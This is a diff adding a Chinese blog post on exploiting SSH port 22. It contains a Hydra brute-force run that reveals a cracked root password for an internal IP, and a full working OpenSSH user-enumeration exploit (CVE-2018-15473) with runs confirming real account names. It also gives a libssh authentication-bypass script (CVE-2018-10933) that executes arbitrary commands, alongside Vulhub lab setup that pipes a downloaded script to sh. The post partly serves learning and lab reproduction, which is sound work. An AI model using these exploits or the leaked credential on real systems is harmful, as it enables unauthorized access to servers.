@@ -1,0 +1,291 @@
+---
+layout:     post
+title:      "22端口漏洞利用"
+subtitle:   "简单介绍了hydra的使用以及Vulhub的安装"
+date:       2020-03-24
+author:     "Malcolm Suen"
+header-img: "img/post-bg-2015.jpg"
+header-mask:  0.3
+catalog: true
+tags:
+    - 高危端口
+    - 漏洞利用
+    - Inspur
+---
+
+## Hydra爆破
+
+使用hydra暴力破解ssh，命令为：
+
+```shell
+hydra -L dic_username_ssh.txt  -P dic_password_ssh.txt -o ssh.log -f -vV -e ns 10.110.31.124 ssh
+# -L 用户名字典
+# -P 密码字典
+# -o ssh.log 输出到ssh.log文件中
+# -vV 显示过程
+# -f 搜到账号密码就停止
+
+# 爆破成功
+[22][ssh] host: 10.110.31.124   login: root   password: 1qaz2wsx
+
+# ssh.log文件
+# Hydra v9.0 run at 2020-03-24 10:32:24 on 10.110.31.124 ssh (hydra -L dic_username_ssh.txt -P dic_password_ssh.txt -o ssh.log -f -vV -e ns 10.110.31.124 ssh)
+[22][ssh] host: 10.110.31.124   login: root   password: 1qaz2wsx
+```
+
+一般来说，弱口令爆破是最有可能的利用方式。
+
+## OpenSSH用户枚举漏洞（CVE-2018-15473）
+
+#### 简介
+
+OpenSSH用户枚举漏洞（CVE-2018-15473）已经通过Github公开(https://github.com/openbsd/src/commit/779974d35b4859c07bc3cb8a12c74b43b0a7d1e0)。尽管该漏洞不能用来生成有效的用户名列表，但依旧可以拿来枚举猜测用户名。
+
+#### 技术细节
+
+通过向OpenSSH服务器发送一个错误格式的公钥认证请求，可以判断是否存在特定的用户名。如果用户名不存在，那么服务器会发给客户端一个验证失败的消息。如果用户名存在，那么将因为解析失败，不返回任何信息，直接中断通讯。该漏洞影响OpenSSH7.7以下的版本，利用脚本如下：
+
+```python
+#!/usr/bin/env python
+ 
+# Copyright (c) 2018 Matthew Daley
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to
+# deal in the Software without restriction, including without limitation the
+# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
+# sell copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
+# IN THE SOFTWARE.
+ 
+import argparse
+import logging
+import paramiko
+import socket
+import sys
+ 
+class InvalidUsername(Exception):
+    pass
+ 
+def add_boolean(*args, **kwargs):
+    pass
+ 
+old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
+        paramiko.common.MSG_SERVICE_ACCEPT]
+ 
+def service_accept(*args, **kwargs):
+    paramiko.message.Message.add_boolean = add_boolean
+    return old_service_accept(*args, **kwargs)
+ 
+def userauth_failure(*args, **kwargs):
+    raise InvalidUsername()
+ 
+paramiko.auth_handler.AuthHandler._handler_table.update({
+    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
+    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
+})
+ 
+logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
+ 
+arg_parser = argparse.ArgumentParser()
+arg_parser.add_argument('hostname', type=str)
+arg_parser.add_argument('--port', type=int, default=22)
+arg_parser.add_argument('username', type=str)
+args = arg_parser.parse_args()
+ 
+sock = socket.socket()
+try:
+    sock.connect((args.hostname, args.port))
+except socket.error:
+    print '[-] Failed to connect'
+    sys.exit(1)
+ 
+transport = paramiko.transport.Transport(sock)
+try:
+    transport.start_client()
+except paramiko.ssh_exception.SSHException:
+    print '[-] Failed to negotiate SSH transport'
+    sys.exit(2)
+ 
+try:
+    transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048))
+except InvalidUsername:
+    print '[*] Invalid username'
+    sys.exit(3)
+except paramiko.ssh_exception.AuthenticationException:
+    print '[+] Valid username'
+```
+
+使用方式：
+
+```shell
+python ssh_checkusername.py 10.110.1.69 --port 22 oracle
+[+] Valid username
+python ssh_checkusername.py 10.110.1.69 --port 22 root
+[+] Valid username
+python ssh_checkusername.py 10.110.1.69 --port 22 admin
+[*] Invalid username
+```
+
+这是一个非常巧妙的漏洞，没有涉及到可以远程代码执行的缓冲区溢出漏洞和输入的验证过程。
+
+在整个过程中既没有缓冲区溢出，使用到的输入内容也都符合验证要求。唯一的问题是可能出于性能需求的考虑，在一些函数处理后才进行对输入的验证，先判断用户名是否存在，如果不存在，那么就没必要进一步验证它的后续请求过程。
+
+如果用户名存在，再对后续请求进行验证，那么会导致不返回信息就中断连接。这样就可以用来枚举一个用户名是否存在。
+
+## libssh 服务端权限认证绕过漏洞（CVE-2018-10933）
+
+#### 安装Vulhub
+
+Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。
+
+```shell
+# If you don't have a docker installed, you'll need to install docker 
+curl -s https://get.docker.com/ | sh 
+# Kali下可使用apt
+apt install docker.io
+
+# Use pip to install docker-compose 
+pip install docker-compose  
+# 安装完成后，执行docker-compose -v，有返回则说明安装成功。
+
+# 安装完成docker和docker-compose后，拉取Vulhub到本地任意目录即可（如/usr/local/）：
+git clone https://github.com/vulhub/vulhub.git
+
+# 如果拉取速度太慢，可以直接下载master分支的压缩包：Vulhub.zip https://github.com/vulhub/vulhub/archive/master.zip。
+
+# Entry vulnerability directory 
+cd /usr/local/vulhub/
+
+# Compile (optional) 
+docker-compose build 
+
+# Run 
+docker-compose up -d 
+```
+
+docker是一个系统服务，所以，安装完成后可能需要手工启动服务：`service start docker`，否则会出现连接失败的情况。
+
+```shell
+docker-compose build && docker-compose up -d
+ERROR: Couldn't connect to Docker daemon at http+docker://localhost - is it running?
+
+If it's at a non-standard location, specify the URL with the DOCKER_HOST environment variable.
+service docker start	# 启动服务
+```
+
+#### 漏洞原理
+
+libssh是一个提供ssh相关接口的开源库，包含服务端、客户端等。其服务端代码中存在一处逻辑错误，攻击者可以在认证成功前发送MSG_USERAUTH_SUCCESS消息，绕过认证过程，未授权访问目标SSH服务器。
+
+#### 复现过程
+
+##### 启动环境
+
+进入路径为：
+
+```
+cd /usr/local/vulhub/libssh/CVE-2018-10933
+```
+
+搭建及运行漏洞环境：
+
+```
+docker-compose build && docker-compose up -d
+```
+
+这可能会花费一些时间，如果网络不好可能会卡很久。
+
+环境启动后，访问`http://your-ip:2222`端口（账号密码：`myuser:mypassword`），这是一个合法的ssh流程：
+
+```
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 myuser@127.0.0.1
+Warning: Permanently added '[127.0.0.1]:2222' (RSA) to the list of known hosts.
+myuser@127.0.0.1's password: 
+# 
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+##### 漏洞复现脚本
+
+```
+#!/usr/bin/env python3
+import sys
+import paramiko
+import socket
+import logging
+
+logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
+bufsize = 2048
+
+def execute(hostname, port, command):
+    sock = socket.socket()
+    try:
+        sock.connect((hostname, int(port)))
+
+        message = paramiko.message.Message()
+        transport = paramiko.transport.Transport(sock)
+        transport.start_client()
+
+        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
+        transport._send_message(message)
+
+        client = transport.open_session(timeout=10)
+        client.exec_command(command)
+
+        # stdin = client.makefile("wb", bufsize)
+        stdout = client.makefile("rb", bufsize)
+        stderr = client.makefile_stderr("rb", bufsize)
+
+        output = stdout.read()
+        error = stderr.read()
+
+        stdout.close()
+        stderr.close()
+
+        return (output+error).decode()
+    except paramiko.SSHException as e:
+        logging.exception(e)
+        logging.debug("TCPForwarding disabled on remote server can't connect. Not Vulnerable")
+    except socket.error:
+        logging.debug("Unable to connect.")
+
+    return None
+
+if __name__ == '__main__':
+    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))
+```
+
+##### 执行任意命令
+
+使用另外一台虚拟机，执行命令
+
+```
+python3 clint.py 192.168.109.128 2222 id
+```
+
+![](/img/in-post/2020-03-24/01.png)
+
+> 参考资料：
+>
+> [OpenSSH用户枚举漏洞（CVE-2018-15473）分析](https://www.anquanke.com/post/id/157607)
+>
+> [利用Vulnhub复现漏洞 - libssh 服务端权限认证绕过漏洞（CVE-2018-10933）](https://blog.csdn.net/jiangbuliu/article/details/95612129)
+
+
+
+
+
+
+
